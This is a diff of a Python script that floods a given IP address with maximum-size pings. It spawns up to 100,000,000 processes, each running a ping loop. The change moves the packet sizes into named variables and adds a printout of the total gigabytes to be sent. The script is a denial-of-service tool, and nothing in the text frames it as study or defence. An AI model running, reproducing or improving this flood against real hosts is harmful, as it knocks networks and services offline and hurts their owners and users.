@@ -57,16 +57,22 @@ if __name__ == "__main__":
         print(f"Valid IP found: {ip}")
 
         if platform.system() == "Darwin":
-            ping_command = f"ping -s 65507 {ip}"
+            ping_size = 65507  # Maximum packet size for macOS
+            ping_command = f"ping -s {ping_size} {ip}"
         elif platform.system() == "Windows":
-            ping_command = f"ping -l 65500 {ip}"
+            ping_size = 65500  # Maximum packet size for Windows
+            ping_command = f"ping -l {ping_size} {ip}"
         else:
             print("Unsupported OS.")
             sys.exit(1)
 
+        total_processes = 100000000
+        total_data = ping_size * total_processes
+        print(f"Total data that will be sent: {total_data / (1024 * 1024 * 1024):.2f} GB")
+
         processes = []
         try:
-            for _ in range(100000000):
+            for _ in range(total_processes):
                 p = multiprocessing.Process(target=ping_loop, args=(ip, ping_command))
                 p.start()
                 processes.append(p)
